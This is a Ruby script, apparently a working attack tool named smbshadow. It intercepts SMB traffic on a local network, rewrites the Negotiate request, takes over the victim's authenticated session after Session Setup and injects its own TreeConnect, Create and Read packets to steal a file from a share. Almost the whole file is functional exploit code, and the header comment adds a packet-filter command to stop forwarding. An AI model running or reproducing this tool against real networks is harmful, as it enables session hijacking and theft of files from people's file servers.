#!/usr/bin/env ruby

# Prevent Packet Forwarding
# printf "block out on $(ruby -e 'require "interfacez"; print Interfacez.default') proto tcp from any to any port 445\n" | sudo pfctl -f - && sudo pfctl -e

require "interfacez"
require "packetgen"
require "packetgen-plugin-smb"
require "ruby_smb"

# Argument Parsing
if ARGV.count != 2
  puts "Usage: sudo ruby smbshadow.rb ip \\\\Share\\\\Path\\\\To\\\\File.txt"
  exit 1
end

target_ip = ARGV[0]
share = ARGV[1].split("\\").reject(&:empty?).first
path = ARGV[1].split("\\").reject(&:empty?)[1..].join("\\")

puts "[|] Warming up..."

# Our Interface Name
iface = Interfacez.default
# Our Ipv4 Address
ip4 = Interfacez.ipv4_address_of(iface)
# Our Mac Address
mac = Interfacez.mac_address_of(iface)
# The Gateway Ipv4 Address
gateip4 = ip4.split(".")[0..2]
gateip4 << "1"
gateip4 = gateip4.join(".")
# The Gateway Mac Address
gatemac = %x[ arp #{gateip4} | cut -d ' ' -f 4 ]
targetmac = %x[ arp #{target_ip} | cut -d ' ' -f 4 ]

puts "[|] Gateway: #{gateip4} | #{gatemac}"
puts "[|] Target: #{target_ip} | #{targetmac}"
puts "[|] Starting..."
@sessions = {}
NTLMSSP_OID = '1.3.6.1.4.1.311.2.2.10'

PacketGen::Plugin::SMB2::Negotiate.send(:remove_const, :Request)

# Syn capture (Connection initiation)
Thread.new {
  PacketGen.capture(
    iface: iface,
    filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0",
    promisc: true
  ) do |packet|
    @sessions[packet.tcp.sport] = {}
    @sessions[packet.tcp.sport][:acknum] = packet.tcp.acknum
    @sessions[packet.tcp.sport][:seqnum] = packet.tcp.seqnum
    @sessions[packet.tcp.sport][:active] = true
    packet.eth.src = mac
    packet.eth.dst = targetmac
    packet.to_w(iface)
  end
}

# Ack capture (TCP Acknowledgement) (Also captures SMB1)
Thread.new {
  PacketGen.capture(
    iface: iface,
    filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] != 0xfe534d42",
    promisc: true
  ) do |packet|
    if @sessions[packet.tcp.sport] && @sessions[packet.tcp.sport][:active]
      @sessions[packet.tcp.sport][:acknum] += packet.tcp.acknum - @sessions[packet.tcp.sport][:acknum]
      @sessions[packet.tcp.sport][:seqnum] += packet.tcp.seqnum - @sessions[packet.tcp.sport][:seqnum]
      packet.tcp.acknum = @sessions[packet.tcp.sport][:acknum]
      packet.tcp.seqnum = @sessions[packet.tcp.sport][:seqnum]
      packet.eth.src = mac
      packet.eth.dst = targetmac
      packet.to_w(iface)
    end
  end
}

# SMB2 Capture (TCP PSH/Acknowledgement)
Thread.new {
  PacketGen.capture(
    iface: iface,
    filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42",
    promisc: true
  ) do |packet|
    # Only Parse Packets from known sessions
    if @sessions[packet.tcp.sport] && @sessions[packet.tcp.sport][:active] && packet.methods.include?(:smb2) && packet.smb2.protocol != 0xff534d42# && packet.ip.dst == target_ip
      # Negotiate Protocol Request
      if packet.smb2.command == 0 && !packet.smb2.flags_response?
        neg_req = packet.smb2.body.to_s
        # Dialect Count Set To 1
        neg_req[2..3] = "\x01\x00".force_encoding("ASCII-8BIT")
        #neg_req[4] = "\x01".force_encoding("ASCII-8BIT")
        packet.smb2.body = neg_req
      # Session Setup Request, NTLMSSP_AUTH
      elsif packet.smb2.command == 1 && !packet.smb2.flags_response? && !packet.smb2_sessionsetup_request.buffer[:token_init][:mech_types].value.map(&:value).include?(NTLMSSP_OID)
        @sessions[packet.tcp.sport][:active] = false
        @sessions[packet.tcp.sport][:acknum] += packet.tcp.acknum - @sessions[packet.tcp.sport][:acknum]
        @sessions[packet.tcp.sport][:seqnum] += packet.tcp.seqnum - @sessions[packet.tcp.sport][:seqnum]
        packet.tcp.acknum = @sessions[packet.tcp.sport][:acknum]
        packet.tcp.seqnum = @sessions[packet.tcp.sport][:seqnum]
        packet.eth.src = mac
        packet.eth.dst = targetmac
        packet.tcp.calc_checksum
        packet.ip.calc_length
        packet.ip.calc_checksum
        packet.to_w(iface, calc: false)
        response = PacketGen.capture(
          iface: iface,
          filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and src port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42 and tcp[4:4] = #{packet.tcp.acknum}",
          promisc: true,
          max: 1
        ).first
        puts "[+] Server Responded."
        # Connect To Tree
        request = RubySMB::SMB2::Packet::TreeConnectRequest.new
        request.smb2_header.tree_id = 0
        request.smb2_header.process_id = 0
        request.smb2_header.credit_charge = 1
        request.smb2_header.credits = 127
        request.path = "\\\\#{response.ip.src}\\#{share}"
        request.smb2_header.message_id = response.smb2.message_id + 1
        request.smb2_header.session_id = response.smb2.session_id
        packet = PacketGen::Packet.gen("Eth", src: mac, dst: targetmac)
          .add("IP", src: packet.ip.src, dst: packet.ip.dst, ttl: packet.ip.ttl)
          .add("TCP", sport: packet.tcp.sport, dport: packet.tcp.dport,
               seqnum: response.tcp.acknum, acknum: response.tcp.seqnum + response.tcp.body.to_s.size,
               window: packet.tcp.window, flags: 0x18)
          .add("NetBIOS::Session")
        packet.tcp.sport = response.tcp.dport
        packet.tcp.dport = response.tcp.sport
        packet.netbios_session.body = request.to_binary_s
        puts "[|] Connecting Tree: #{share}"
        packet.to_w(iface)
        response = PacketGen.capture(
          iface: iface,
          filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and src port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42 and tcp[4:4] = #{packet.tcp.acknum}",
          promisc: true,
          max: 1
        ).first
        # Set TreeId
        tree_id = response.smb2.tree_id
        # Set ProcessId
        process_id = response.smb2.async_id
        # Open File
        request = RubySMB::SMB2::Packet::CreateRequest.new
        request.smb2_header.tree_id = tree_id
        request.smb2_header.process_id = process_id
        request.smb2_header.credit_charge = 1
        request.smb2_header.credits = 256
        request.smb2_header.message_id = response.smb2.message_id + 1
        request.smb2_header.session_id = response.smb2.session_id
        request.file_attributes.directory = 0
        request.file_attributes.normal = 1
        request.create_options.directory_file = 0
        request.create_options.non_directory_file = 1
        request.share_access.read_access = 1
        request.desired_access.read_data = 1
        request.requested_oplock = 255
        request.impersonation_level = RubySMB::ImpersonationLevels::SEC_IMPERSONATE
        request.create_disposition = RubySMB::Dispositions::FILE_OPEN
        request.name = path
        packet = PacketGen::Packet.gen("Eth", src: mac, dst: targetmac)
          .add("IP", src: packet.ip.src, dst: packet.ip.dst, ttl: packet.ip.ttl)
          .add("TCP", sport: packet.tcp.sport, dport: packet.tcp.dport,
               seqnum: response.tcp.acknum, acknum: response.tcp.seqnum + response.tcp.body.to_s.size,
               window: packet.tcp.window, flags: 0x18)
          .add("NetBIOS::Session")
        packet.tcp.sport = response.tcp.dport
        packet.tcp.dport = response.tcp.sport
        packet.netbios_session.body = request.to_binary_s
        puts "[|] Opening: #{path}"
        packet.to_w(iface)
        response = PacketGen.capture(
          iface: iface,
          filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and src port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42 and tcp[4:4] = #{packet.tcp.acknum}",
          promisc: true,
          max: 1
        ).first
        # Read File
        create_response = RubySMB::SMB2::Packet::CreateResponse.read(response.smb2.to_s)
        request = RubySMB::SMB2::Packet::ReadRequest.new
        request.smb2_header.tree_id = tree_id
        request.smb2_header.process_id = process_id
        request.smb2_header.credit_charge = 0
        request.smb2_header.credits = 256
        request.smb2_header.message_id = response.smb2.message_id + 1
        request.smb2_header.session_id = response.smb2.session_id
        request.file_id = create_response.file_id
        # Only Read First 1024 Bytes For Now
        request.read_length = [1024, create_response.end_of_file].min
        request.offset = 0
        packet = PacketGen::Packet.gen("Eth", src: mac, dst: targetmac)
          .add("IP", src: packet.ip.src, dst: packet.ip.dst, ttl: packet.ip.ttl)
          .add("TCP", sport: packet.tcp.sport, dport: packet.tcp.dport,
               seqnum: response.tcp.acknum, acknum: response.tcp.seqnum + response.tcp.body.to_s.size,
               window: packet.tcp.window, flags: 0x18)
          .add("NetBIOS::Session")
        packet.tcp.sport = response.tcp.dport
        packet.tcp.dport = response.tcp.sport
        packet.netbios_session.body = request.to_binary_s
        puts "[|] Reading: #{path}"
        packet.to_w(iface)
        response = PacketGen.capture(
          iface: iface,
          filter: "ether dst #{mac} and not ether src #{gatemac} and not ether src #{mac} and src port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42 and tcp[4:4] = #{packet.tcp.acknum}",
          promisc: true,
          max: 1
        ).first
        read_response = RubySMB::SMB2::Packet::ReadResponse.read(response.smb2.to_s)
        print "[+] Data:"
        puts read_response.buffer
        puts "[+] Done!"
        exit 0
      end
    end
    if @sessions[packet.tcp.sport] && @sessions[packet.tcp.sport][:active]
      @sessions[packet.tcp.sport][:acknum] += packet.tcp.acknum - @sessions[packet.tcp.sport][:acknum]
      @sessions[packet.tcp.sport][:seqnum] += packet.tcp.seqnum - @sessions[packet.tcp.sport][:seqnum]
      packet.tcp.acknum = @sessions[packet.tcp.sport][:acknum]
      packet.tcp.seqnum = @sessions[packet.tcp.sport][:seqnum]
      packet.eth.src = mac
      packet.eth.dst = targetmac
      packet.tcp.calc_checksum
      packet.ip.calc_length
      packet.ip.calc_checksum
      packet.to_w(iface, calc: false)
    end
  end
}

Thread.list.each{ |t| t.join unless t == Thread.current }
Process.waitall
__END__
